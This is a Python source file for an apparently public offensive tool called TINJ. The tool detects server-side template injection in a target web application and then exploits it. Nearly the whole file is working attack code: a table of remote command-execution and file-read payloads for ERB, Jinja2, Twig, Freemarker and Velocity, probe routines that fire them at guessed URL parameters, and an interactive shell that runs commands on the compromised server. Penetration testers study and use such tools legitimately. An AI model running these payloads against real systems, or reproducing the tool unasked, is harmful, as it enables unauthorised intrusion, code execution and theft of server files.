"""
Server-Side Template Injection (SSTI) Detection and Exploitation Tool
Author: Cyto0x
Version: 1.1
"""

import requests
import re
import argparse
import html
import urllib3
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL/TLS warnings for proxy debugging
urllib3.disable_warnings(InsecureRequestWarning)

# Configuration Constants
UNIQUE_PREFIX = "TINJ_"  # Template INJection marker prefix
REQUEST_TIMEOUT = 15     # Timeout for HTTP requests in seconds

# Template engine payload database
EXPLOIT_PAYLOADS = {
    "ERB": {
        "exec": f"{UNIQUE_PREFIX}START<%= `COMMAND` %>TINJ_END",
        "read": f"{UNIQUE_PREFIX}START<%= File.read('FILE') %>TINJ_END",
    },
    "Jinja2": {
        "exec": f"{UNIQUE_PREFIX}START{{ self.__init__.__globals__.__builtins__.__import__('os').popen('COMMAND').read() }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['open']('FILE').read() }}TINJ_END",
    },
    "Twig": {
        "exec": f"{UNIQUE_PREFIX}START{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('COMMAND') }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('cat FILE') }}TINJ_END"
    },
    "Freemarker": {
        "exec": f"{UNIQUE_PREFIX}START<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${{ ex(\"COMMAND\") }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START${{product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\"FILE\").toURL().openStream().readAllBytes()?join(\" \")}}TINJ_END"
    },
    "Velocity": {
        "exec": f"{UNIQUE_PREFIX}START#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"COMMAND\"))TINJ_END",
        "read": f"{UNIQUE_PREFIX}START#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($is=$class.inspect(\"java.io.InputStream\").type)#set($fis=$class.inspect(\"java.io.FileInputStream\").type.getConstructor($str).newInstance(\"FILE\"))TINJ_END"
    }
}

class ErrorBasedEngineDetector:
    """Detects template engines through error message analysis"""
    
    def __init__(self, session):
        """
        Initialize detector with common error-inducing payload
        
        Args:
            session: requests.Session object for HTTP communication
        """
        self.session = session
        self.error_payload = "${{<%[%'\"}}%\\"  # Malformed template payload
        self.engine_patterns = {
            "Jinja2": r"jinja2",
            "Twig": r"twig",
            "Django": r"django",
            "Freemarker": r"freemarker|freeMarker",
            "ERB": r"erb|Erb",
            "Handlebars": r"handlebars",
            "Velocity": r"velocity"
        }

    def detect(self, url, params):
        """
        Scan for template engines through error responses
        
        Args:
            url: Target URL to test
            params: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        for param in params:
            try:
                response = self.session.get(
                    url,
                    params={param: self.error_payload},
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 500:
                    for engine, pattern in self.engine_patterns.items():
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return {
                                "parameter": param,
                                "engine": engine,
                                "method": "error-based",
                                "evidence": f"Error message contains '{engine}'"
                            }
            except requests.exceptions.RequestException as e:
                print(f"[!] Request failed for parameter {param}: {str(e)}")
                continue
        return None

class EvaluationBasedEngineDetector:
    """Identifies template engines through mathematical evaluation"""
    
    def __init__(self, session):
        """
        Initialize detector with engine-specific payloads
        
        Args:
            session: requests.Session object for HTTP communication
        """
        self.session = session
        self.payload_map = {
            "ERB": {
                "payload": f"{UNIQUE_PREFIX}ERB<%= 7*7 %>",
                "expected": f"{UNIQUE_PREFIX}ERB49"
            },
            "Jinja2": {
                "payload": f"{UNIQUE_PREFIX}JINJA{{7*'7'}}",
                "expected": f"{UNIQUE_PREFIX}JINJA7777777"
            },
            "Twig": {
                "payload": f"{UNIQUE_PREFIX}TWIG{{7*7}}",
                "expected": f"{UNIQUE_PREFIX}TWIG49"
            },
            "Freemarker": {
                "payload": f"{UNIQUE_PREFIX}FREEMARKER${{7*7}}",
                "expected": f"{UNIQUE_PREFIX}FREEMARKER49"
            },
            "Handlebars": {
                "payload": f"{UNIQUE_PREFIX}HANDLE{{7*7}}",
                "expected": f"{UNIQUE_PREFIX}HANDLE49"
            },
            "Velocity": {
                "payload": f"{UNIQUE_PREFIX}VELO#set($x=7*7)${{x}}",
                "expected": f"{UNIQUE_PREFIX}VELO49"
            }
        }

    def detect(self, url, params):
        """
        Execute evaluation-based detection workflow
        
        Args:
            url: Target URL to test
            params: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        for param in params:
            for engine, data in self.payload_map.items():
                try:
                    response = self.session.get(
                        url,
                        params={param: data["payload"]},
                        timeout=REQUEST_TIMEOUT,
                        verify=False
                    )
                    
                    if data["expected"] in response.text:
                        return {
                            "parameter": param,
                            "engine": engine,
                            "method": "evaluation-based",
                            "evidence": f"Matched: {data['expected']}"
                        }
                except requests.exceptions.RequestException as e:
                    print(f"[!] Detection failed for {engine}: {str(e)}")
                    continue
        return None

class SSTIScanner:
    """Main scanner class coordinating detection workflows"""
    
    def __init__(self, proxies=None):
        """
        Initialize scanner with HTTP session configuration
        
        Args:
            proxies: Dictionary of proxies to use for requests
        """
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TINJ-Scanner/1.1"
        })
        
        if proxies:
            self.session.proxies.update(proxies)
            self.session.verify = False  # Disable SSL verification for proxies

    def scan(self, target_url, parameters):
        """
        Execute complete scanning workflow
        
        Args:
            target_url: URL to test for vulnerabilities
            parameters: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        # First try error-based detection
        error_detector = ErrorBasedEngineDetector(self.session)
        error_result = error_detector.detect(target_url, parameters)
        if error_result:
            return error_result
        
        # Fallback to evaluation-based detection
        eval_detector = EvaluationBasedEngineDetector(self.session)
        return eval_detector.detect(target_url, parameters)

class SSTIExploiter:
    """Exploitation handler for confirmed vulnerabilities"""
    
    def __init__(self, session, base_url, vulnerable_param, engine):
        """
        Initialize exploiter with target details
        
        Args:
            session: Established requests session
            base_url: Vulnerable endpoint URL
            vulnerable_param: Confirmed vulnerable parameter
            engine: Detected template engine
        """
        self.session = session
        self.base_url = base_url
        self.param = vulnerable_param
        self.engine = engine
        self.payloads = EXPLOIT_PAYLOADS.get(engine, {})

    def execute_command(self, command):
        """
        Generate and execute command injection payload
        
        Args:
            command: System command to execute
            
        Returns:
            Command output or None
        """
        if not self.payloads.get("exec"):
            print(f"[-] Execution not supported for {self.engine}")
            return None
            
        payload = self.payloads["exec"].replace("COMMAND", command)
        return self._send_payload(payload)

    def read_file(self, filename):
        """
        Generate and execute file read payload
        
        Args:
            filename: Path to file to read
            
        Returns:
            File contents or None
        """
        if not self.payloads.get("read"):
            print(f"[-] File read not supported for {self.engine}")
            return None
            
        payload = self.payloads["read"].replace("FILE", filename)
        return self._send_payload(payload)

    def _send_payload(self, payload):
        """
        Execute payload and process response
        
        Args:
            payload: Fully constructed exploit payload
            
        Returns:
            Cleaned response text or None
        """
        try:
            response = self.session.get(
                self.base_url,
                params={self.param: payload},
                timeout=REQUEST_TIMEOUT,
                verify=False
            )
            return self._clean_response(response.text)
        except Exception as e:
            print(f"[-] Payload delivery failed: {str(e)}")
            return None
        
    def _clean_response(self, text):
        """
        Extract and clean response between markers
        
        Args:
            text: Raw response text
            
        Returns:
            Cleaned command output or default message
        """
        match = re.search(r'TINJ_START(.*?)TINJ_END', text, re.DOTALL)
        if match:
            cleaned = html.unescape(match.group(1))
            return re.sub(r'\s+', ' ', cleaned).strip()
        return "No output captured between markers"

def interactive_shell(exploiter):
    """
    Provide interactive command execution interface
    
    Args:
        exploiter: Initialized SSTIExploiter instance
    """
    print(f"\n[+] Entering {exploiter.engine} exploitation shell")
    print("[!] Type 'exit' to quit")
    print("[!] Commands will be executed on the target server\n")
    
    while True:
        try:
            cmd = input("tinj-shell> ").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
                
            if cmd.startswith("read "):
                _, filename = cmd.split(" ", 1)
                result = exploiter.read_file(filename)
            else:
                result = exploiter.execute_command(cmd)
                
            if result:
                # print(f"\n=== COMMAND OUTPUT ===\n{result}\n======================")
                print(f"{result}")
            else:
                print("[-] No response received from server")
                
        except KeyboardInterrupt:
            print("\n[-] Terminating session...")
            break
        except Exception as e:
            print(f"[-] Execution error: {str(e)}")

if __name__ == "__main__":
    # Command-line interface configuration
    parser = argparse.ArgumentParser(
        description='TINJ - Template INJection Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''Usage Examples:
  Basic scan:
    python tinj.py --url https://vuln-site.com
  
  Scan through proxy:
    python tinj.py --url https://vuln-site.com --proxy 127.0.0.1:8080
  
  Custom parameters:
    python tinj.py --url https://vuln-site.com --params "user_input,custom_field"
''')
    parser.add_argument('--url', required=True, 
                      help='Target URL to scan')
    parser.add_argument('--proxy', 
                      help='Proxy server (IP:PORT) for traffic inspection')
    parser.add_argument('--params', 
                      help='Comma-separated list of parameters to test',
                      default="message,email,username,name,search,q,input,id")
    
    args = parser.parse_args()

    # Proxy configuration
    proxies = {}
    if args.proxy:
        proxies = {
            'http': f'http://{args.proxy}',
            'https': f'http://{args.proxy}'
        }
        print(f"[*] Routing traffic through proxy: {args.proxy}")

    # Parameter processing
    parameters = [p.strip() for p in args.params.split(',')]
    
    # Execute scanning workflow
    scanner = SSTIScanner(proxies=proxies if args.proxy else None)
    result = scanner.scan(args.url, parameters)
    
    if result:
        print("\n[+] Confirmed Vulnerability")
        print(f"    Parameter: {result['parameter']}")
        print(f"    Engine: {result['engine']}")
        print(f"    Method: {result['method']}")
        print(f"    Evidence: {result['evidence']}")
        
        # Initialize exploitation session
        exploiter = SSTIExploiter(
            scanner.session,
            args.url,
            result['parameter'],
            result['engine']
        )
        interactive_shell(exploiter)
    else:
        print("\n[-] No template injection vulnerabilities detected")
